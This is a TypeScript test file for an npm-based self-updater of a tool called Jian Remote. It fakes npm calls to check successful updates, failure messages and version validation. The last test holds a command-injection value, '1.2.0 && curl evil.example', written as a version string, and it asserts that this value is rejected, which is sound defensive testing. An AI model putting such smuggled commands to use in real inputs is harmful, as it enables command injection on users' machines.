import assert from 'node:assert/strict';
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { after, test } from 'node:test';
import type { RemoteTask } from '@jian/contracts';
import { installRelease, type Run } from '../src/npm.ts';
import { npmUpdater } from '../src/self-update.ts';

/** A global npm root holding Jian Remote at `version`, as `npm install -g` would leave it. */
const root = mkdtempSync(join(tmpdir(), 'jian-npm-root-'));
after(() => rmSync(root, { recursive: true, force: true }));
function published(version: string) {
  const dist = join(root, '@jian-ai', 'remote-control', 'dist');
  mkdirSync(dist, { recursive: true });
  writeFileSync(join(dist, 'jian-remote.mjs'), `export const PACKAGE_VERSION = '${version}';\n`);
}

const installer = { kind: 'npm' as const, npm: '/opt/node/bin/npm' };
const task: RemoteTask = {
  id: '6f1c2f0e-4a59-4c11-9a52-1f1b5e7d3c10',
  kind: 'update',
  command: null,
  cwd: null,
  timeoutMs: 300_000,
  update: { version: '1.2.0' },
};

/** npm and the new release's CLI as this test scripts them; nothing real runs. */
function fakeRun({ install = 0, handover = 0 } = {}) {
  const calls: string[][] = [];
  const run: Run = (command, args) => {
    calls.push([command, ...args]);
    if (args[0] === 'install') {
      if (install === 0) published('1.2.0');
      return { status: install, stdout: '', stderr: 'npm ERR! code E404', error: undefined };
    }
    if (args[0] === 'root') return { status: 0, stdout: `${root}\n`, stderr: '', error: undefined };
    return { status: handover, stdout: '', stderr: 'EACCES', error: undefined };
  };
  return { run, calls };
}

test('an update installs the release with npm, lets it put itself in place, then restarts', async () => {
  const { run, calls } = fakeRun();
  let restarted = 0;
  const update = npmUpdater(installer, {
    spawn: run,
    version: '1.1.4',
    restart: async () => {
      restarted += 1;
    },
  });

  const { result, restart } = await update(task);

  assert.deepEqual(result, {
    taskId: task.id,
    exitCode: 0,
    stdout: 'Updated Jian Remote from 1.1.4 to 1.2.0.',
    stderr: '',
    update: { from: '1.1.4', to: '1.2.0' },
  });
  assert.deepEqual(calls[0], [installer.npm, 'install', '-g', '@jian-ai/remote-control@1.2.0']);
  // The new release's own CLI copies itself into place; the old process restarts only later.
  assert.deepEqual(calls.at(-1)?.slice(1), [
    join(root, '@jian-ai', 'remote-control', 'dist', 'jian-remote.mjs'),
    'reinstall',
    '--no-restart',
  ]);
  assert.equal(restarted, 0);
  await restart?.();
  assert.equal(restarted, 1);
});

test('a failed update says why and leaves the running worker as it is', async () => {
  for (const [scripted, reason] of [
    [{ install: 1 }, /npm could not install @jian-ai\/remote-control@1\.2\.0\. npm ERR! code E404/],
    [{ handover: 1 }, /1\.2\.0 is installed, but could not put itself in place\. EACCES/],
  ] as const) {
    const { run } = fakeRun(scripted);
    const update = npmUpdater(installer, {
      spawn: run,
      version: '1.1.4',
      restart: async () => assert.fail('a failed update must not restart'),
    });
    const { result, restart } = await update(task);
    assert.equal(result.exitCode, 1);
    assert.match(result.stderr, reason);
    assert.equal(restart, undefined);
  }
});

test('npm is never handed something that is not a release', () => {
  const { run, calls } = fakeRun();
  const installed = installRelease(installer, '1.2.0 && curl evil.example', { spawn: run });
  assert.deepEqual(installed, { ok: false, error: 'Not a release: 1.2.0 && curl evil.example' });
  assert.deepEqual(calls, []);
});
